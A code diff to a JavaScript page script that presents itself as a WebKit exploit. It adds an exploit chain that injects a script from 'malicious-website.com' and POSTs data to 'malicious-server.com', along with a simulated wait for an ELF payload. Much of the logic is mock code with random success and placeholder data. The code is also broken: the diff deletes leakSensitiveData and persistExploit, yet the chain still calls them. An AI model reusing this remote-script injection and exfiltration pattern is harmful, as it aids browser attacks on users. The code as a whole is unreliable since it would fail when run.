@@ -53,6 +53,76 @@ document.addEventListener('DOMContentLoaded', function () {
 
     log("WebKit Exploit started.");
 
+    function waitForPayload() {
+        log("Waiting for ELF payload...");
+
+        // Simulate the waiting process, display the "waiting for payload" message
+        let payloadReceived = false;
+
+        // Simulate a timeout or fetch operation to "wait" for the payload
+        setInterval(() => {
+            // You can simulate the payload reception with a mock condition here
+            if (!payloadReceived) {
+                log("Still waiting for the ELF payload...");
+            }
+
+            // Simulate checking for the payload with mock success
+            if (Math.random() > 0.95) { // Simulate random success for testing
+                payloadReceived = true;
+                log("Payload received successfully.");
+            }
+        }, 5000); // Check every 5 seconds
+    }
+
+    function escalatePrivileges() {
+        log("Attempting privilege escalation.");
+        // No redirection code here anymore
+        log("Privilege escalation complete without redirection.");
+    }
+
+    function injectMaliciousCode() {
+        log("Injecting malicious code.");
+        const script = document.createElement("script");
+        script.src = "https://malicious-website.com/exploit.js";
+        document.body.appendChild(script);
+    }
+
+    function deliverPayload() {
+        log("Delivering payload to attacker server.");
+        fetch("https://malicious-server.com/payload", {
+            method: "POST",
+            body: JSON.stringify({ exploit: "data" }),
+            headers: { "Content-Type": "application/json" }
+        });
+    }
+
+    function exploitChain() {
+        // Check read/write privileges
+        const readSuccess = checkReadPrivilege();
+        const writeSuccess = checkWritePrivilege();
+
+        if (readSuccess && writeSuccess) {
+            log("Both read and write privileges are successfully exploited!");
+
+            // Leak sensitive data
+            leakSensitiveData();
+
+            // Escalate privileges by manipulating critical objects or actions
+            escalatePrivileges();
+
+            // Inject malicious code into the page
+            injectMaliciousCode();
+
+            // Persist exploit by storing data in localStorage
+            persistExploit();
+
+            // Deliver payload to attacker server
+            deliverPayload();
+        } else {
+            log("Read and/or write privileges failed. Exploit chain aborted.");
+        }
+    }
+
     function checkReadPrivilege() {
         let foo = 42;
         let readSuccess = false;
@@ -112,65 +182,11 @@ document.addEventListener('DOMContentLoaded', function () {
         return leak();
     }
 
-    function leakSensitiveData() {
-        let sensitiveData = "Sensitive data here";
-        log(`Leaked data: ${sensitiveData}`);
-    }
+    // Start waiting for the ELF payload
+    waitForPayload();
 
-    function escalatePrivileges() {
-        log("Attempting privilege escalation.");
-        // Comment out or remove the line causing redirection to stop it.
-        // window.location.href = "https://attacker-website.com";
-        log("Privilege escalation complete without redirection.");
-    }
-
-    function injectMaliciousCode() {
-        log("Injecting malicious code.");
-        const script = document.createElement("script");
-        script.src = "https://malicious-website.com/exploit.js";
-        document.body.appendChild(script);
-    }
-
-    function persistExploit() {
-        log("Persisting exploit in localStorage.");
-        localStorage.setItem("exploit_persistent", "true");
-    }
-
-    function deliverPayload() {
-        log("Delivering payload to attacker server.");
-        fetch("https://malicious-server.com/payload", {
-            method: "POST",
-            body: JSON.stringify({ exploit: "data" }),
-            headers: { "Content-Type": "application/json" }
-        });
-    }
-
-    function exploitChain() {
-        // Check read/write privileges
-        const readSuccess = checkReadPrivilege();
-        const writeSuccess = checkWritePrivilege();
-
-        if (readSuccess && writeSuccess) {
-            log("Both read and write privileges are successfully exploited!");
-
-            // Leak sensitive data
-            leakSensitiveData();
-
-            // Escalate privileges by manipulating critical objects or actions
-            escalatePrivileges();
-
-            // Inject malicious code into the page
-            injectMaliciousCode();
-
-            // Persist exploit by storing data in localStorage
-            persistExploit();
-
-            // Deliver payload to attacker server
-            deliverPayload();
-        } else {
-            log("Read and/or write privileges failed. Exploit chain aborted.");
-        }
-    }
+    // Simulate the exploit chain running
+    exploitChain();
 
     // Limit the number of iterations for debugging purposes
     const MAX_ITERATIONS = 20; // Reduce the iterations for troubleshooting
